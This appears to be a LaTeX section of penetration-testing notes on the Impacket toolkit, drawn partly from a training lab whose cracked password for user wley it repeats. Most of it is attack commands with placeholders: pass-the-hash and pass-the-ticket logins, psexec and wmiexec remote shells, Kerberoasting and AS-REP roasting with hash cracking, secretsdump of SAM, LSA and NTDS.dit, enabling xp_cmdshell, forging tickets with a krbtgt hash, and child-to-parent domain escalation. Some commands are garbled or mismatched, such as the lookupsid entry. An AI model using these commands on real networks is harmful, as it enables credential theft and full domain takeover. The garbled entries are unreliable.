\section{Impacket}
\label{tool:impacket}
\subsection*{Introduction}
Impacket is a versatile toolkit that providesmany different ways to enumerate,
interact, and exploit Windows protocols and find the information needed using
Python. The tool is actively maintained and has many contributors, especially
when new attack techniques arise. 

We could perform many other actions with Impacket, but we will only highlight a few in this section; wmiexec.py and psexec.py. Earlier in the poisoning section, we grabbed a hash for the user wley with Responder and cracked it to obtain the password transporter@4. We will see in the next section that this user is a local admin on the ACADEMY-EA-FILE host. We will utilize the credentials for the next few actions.


\subsection*{Authentication metod for tools}
\begin{verbatim}
# login / password 
IMPACKET_CMD 'DOMAIN/SAMAN:PASSWORD@IP'

# pass-the-hash
IMPACKET_CMD  'DOMAIN/SAMAN@IP' -hashes 'LM_HASH:NT_HASH'

# pass-the-ticket
set KRB5CCNAME=FILE_PATH
IMPACKET_CMD  -k -no-pass 'DOMAIN/SAMAN@TARGET'

# AES key to use for Kerberos Authentication (128 or 256 bits)
IMPACKET_CMD -aesKey hex key 'DOMAIN/SAMAN@TARGET'

# Read keys for SPN from keytab file
IMPACKET_CMD -keytab KEYTAB 'DOMAIN/SAMAN@TARGET'

\end{verbatim}




\subsection*{smbclient.py}
\label{tool:impacket:smbclient}

\begin{verbatim}
smbclient  -I IP -L ACTIVE -N -U ""
\end{verbatim}

\subsection*{psexec.py}
\label{tool:impacket:psexec}

\verb+Psexec.py+ is a
clone of the
\href{https://docs.microsoft.com/en-us/sysinternals/downloads/psexec}{psexec}
executable from sysinternal, but works slightly differently
from the original. The tool creates a remote service by uploading a
randomly-named executable to the i\verb+ADMIN$+ share on the target host. It then registers the service via RPC and the Windows Service Control Manager. Once established, communication happens over a named pipe, providing an interactive remote shell as SYSTEM on the victim host.

\begin{verbatim}
psexec.py DOMAIN/SAMAN:PASSWORD@IP
psexec.py DOMAIN/SAMAN@TARGET -k -no-pass 

\end{verbatim}

\subsection*{wmiexec.py}
\label{tool:impacket:wmiexec}
miexec.py utilizes a semi-interactive shell where commands are executed through
\href{https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page}{Windows
Management Instrumentation}. It does not drop any files or executables on the target host and generates fewer logs than other modules. After connecting, it runs as the local admin user we connected with (this can be less obvious to someone hunting for an intrusion than seeing SYSTEM executing many commands). This is a more stealthy approach to execution on hosts than other tools, but would still likely be caught by most modern anti-virus and EDR systems. We will use the same account as with psexec.py to access the host.

he downside of this is that if a vigilant defender checks event logs and looks at event ID 4688: A new process has been created, they will see a new process created to spawn cmd.exe and issue a command. This isn't always malicious activity since many organizations utilize WMI to administer computers, but it can be a tip-off in an investigation

\begin{verbatim}
wmiexec.py DOMAIN/SAMAN:PASSWORD@IP
\end{verbatim}


\subsection*{GetUserSPNs.py}
\label{tool:impacket:GetUserSPNs}
a python script that it discovers SPN, extract TGS and dump service Hash. It
allows authenticate to the Domain Controller with a cleartext password, NT
password hash, or even a Kerberos ticket.


\begin{verbatim}
# Listing SPN Accounts
GetUserSPNs.py -dc-ip IP DOMAIN/SAMAN:PASSWORD

# Requesting all TGS Tickets
GetUserSPNs.py -dc-ip IP DOMAIN/SAMAN:PASSWORD
    -request -outputfile hashes.kerberoast

# Requesting a Single TGS ticket
GetUserSPNs.py -dc-ip IP DOMAIN/SAMAN:PASSWORD
    -request-user NAME -outputfile hashes.kerberoast
\end{verbatim}

\subsection*{GetADUser.py}
\label{tool:impacket:GetADUser}
This script will gather data about the domain’s users and their corresponding
email addresses. It will also include some extra information about last logon
and last password set attributes. If no entries are returned that means users
don’t have email addresses specified. If so, you can use the -all-users
parameter.

\begin{verbatim}
GetADUser.py -user USER_NAME DOMAIN/SAMAN:PASSWORD
GetADUser.py -all  DOMAIN/SAMAN:PASSWORD
\end{verbatim}

\subsection*{GetUserSPNs.py}
\label{tool:impacket:GetUserSPNs}
\begin{verbatim}
GetUserSPNs.py -target-domain FQDN DOMAIN_NAME/SAMAN
\end{verbatim}

\subsection*{GetNPUSers.py}
\label{tool:impacket:GetNPUSers}
This script will attempt to list and get TGTs for those users that have the
property ‘Do not require Kerberos preauthentication’ set
(\verb+UF_DONT_REQUIRE_PREAUTH+). For those users with such configuration, a
John The Ripper output will be generated so you can send it for cracking.

\begin{verbatim}
#Try all the usernames in usernames.txt
 GetNPUsers.py FQDN/ -usersfile usernames.txt \
    -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
GetNPUsers.py FQDN/SAMAN:PASSWORD -request \
    -format hashcat -outputfile hashes.asreproast

john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
\end{verbatim}


\subsection*{TicketConverter.py}
\label{tool:impacket:TickerConverter}

This script will convert kirbi files (commonly used by mimikatz) into ccache
files used by impacket, and vice versa. As you can observe that the above
script helps in generating the ccache file and with the of this script we can
convert into kirbi.


\subsection*{GetTGT.py}
\label{tool:impacket:GetTGT}


This python script will request a TGT and save it as ccache for given a
password, hash or aesKey. That we can be injected directory for access the
requested service.

we have used getTGT to generate the ccache and used KERB5CCNAME pass the ccache
file for the requested service. This is completely remote attack without using
a local system of the compromised victim, but you need to compromise NTLM
hashes for that, type following to conduct pass the ccache attack remotely.

\subsection*{secretsdump.py}
\label{tool:impacket:secretsdump}
Impacket’s secretsdump.py will perform various techniques to dump secrets from
the remote machine without executing any agent. Techniques include reading SAM
and LSA secrets from registries, dumping NTLM hashes, plaintext credentials,
and kerberos keys, and dumping NTDS.dit. 

\subsubsection*{Usefull options}
\begin{itemize}
    \item \verb+-outputfile BASE_NAME+ 
    \item \verb+-just-dc-ntlm+ (NTDS.DIT) only NTLM hashes
    \item \verb+-just-dc+ (NTDS.DIT) NTLM hashes and Kerberos keys
    \item \verb+-just-dc-user <USERNAME>+ only extract data for a specific user
    \item \verb+-history+ password history
    \item \verb+-user-status+: active/disabled 
    \item \verb+-pwd-last-set+  when each account's password was last changed
\end{itemize}

Regarding remote method by default use \verb+smbexec+ an explicit method
(\verb+smbexec+, \verb+wmiexec+, \verb+mmcexec+) can be
expressed using \verb+ -use-vss -exec method METHOD+.

\subsubsection*{Remote SAM dump from registry}
\label{tool:impacket:secretsdump:remote:SAM}

\begin{verbatim}
secretsdump.py DOMAIN/SAMAN:PASSWORD@IP
\end{verbatim}

\subsubsection*{Remote NTDS dump}
\label{tool:impacket:secretsdump:remote:NTDS}

\begin{verbatim}
secretsdump.py -just-dc DOMAIN/SAMAN:PASSWORD@DC_IP
secretsdump.py -k -no-pass DOMAIN/SAMAN@IP -target-ip DC_IP -just-dc-user SAMAN 
\end{verbatim}


\subsubsection*{Offline secrets dumping from exported hives or ntds}
\label{tool:impacket:secretsdump:offline}

\begin{verbatim}
# Offline dumping of LSA secrets from exported hives
secretsdump.py -security '/path/to/security.save' \
               -system '/path/to/system.save' \
               LOCAL

# Offline dumping of SAM secrets from exported hives
secretsdump.py -sam '/path/to/sam.save' -system '/path/to/system.save' LOCAL

# Offline dumping of SAM & LSA secrets from exported hives
secretsdump.py -sam '/path/to/sam.save'            \
               -security '/path/to/security.save'  \
               -system '/path/to/system.save'      \
               LOCAL

# Offline dumping from NTDS.dit
secretsdump.py -system '/path/to/system.save' -ntds '/path/to/ntds.dit' LOCAL


\end{verbatim}



\subsection*{smbserver.py}
\label{tool:impacket:smbserver}

\begin{verbatim}
smbserver.py -smb2support NAME LOCATION
\end{verbatim}

\subsection*{mssqlclient.py}
\label{tool:impacket:mssqlclient}

\begin{verbatim}
# try without -windows-auth
mssqlclient.py DOMAIN/SAMAN@IP [-windows-auth]

help

enable_xp_cmdshell
xp_cmdshell whoami /priv

\end{verbatim}
Here we can enumerate the rights that our user has on the system and see that
we have
\href{https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege}{SeImpersonatePrivilege},
which can be leveraged in combination with a tool such as
\href{https://github.com/ohpe/juicy-potato}{JuicyPotato},
\href{https://github.com/itm4n/PrintSpoofer}{PrintSpoofer}, or
\href{https://github.com/antonioCoco/RoguePotato}{RoguePotato} to escalate to
\verb+SYSTEM+ level privileges, depending on the target host, and use this access to continue toward our goal. 

These methods are covered in the SeImpersonate and SeAssignPrimaryToken of the Windows Privilege Escalation module.

\subsection*{lookupsid.py}
\label{tool:impacket:lookupsid}
perform SID brute forcing to find the SID.

\begin{verbatim}
smbserver.py FQDN/SAMAN@DC_IP
\end{verbatim}

\subsection*{ticketer.py}
\label{tool:impacket:tickerter}

This script will create TGT/TGS tickets from scratch or based on a template
(legally requested from the KDC) allowing you to customize some of the
parameters set inside the \verb+PAC_LOGON_INFO+ structure, in particular the groups,
extrasids, \ldots.

\begin{verbatim}
ticketer.py -nthash KRBTGT_HASH  -domain FQDN -domain-sid DOM_SID -extra-sid \
    SID_ETS-ADMIN NAME
\end{verbatim}

will save the ticket as a
\href{https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html}{credential
cache (ccache) file} that can be set to \verb+KRB5CCNAME+ environment variable

\subsection*{raiseChild.py}
\label{tool:impacket:raiseChild}

\begin{verbatim}
aiseChild.py -target-exec DC_IP CHILD_FQDN/ADMIN_SAMAN
\end{verbatim}

\subsection*{links}
\begin{itemize}
    \item secretsdump
        \begin{itemize}
            \item
                \url{https://riccardoancarani.github.io/2020-05-10-hunting-for-impacket/#secretsdumppy}
        \end{itemize}
\end{itemize}
\url{}
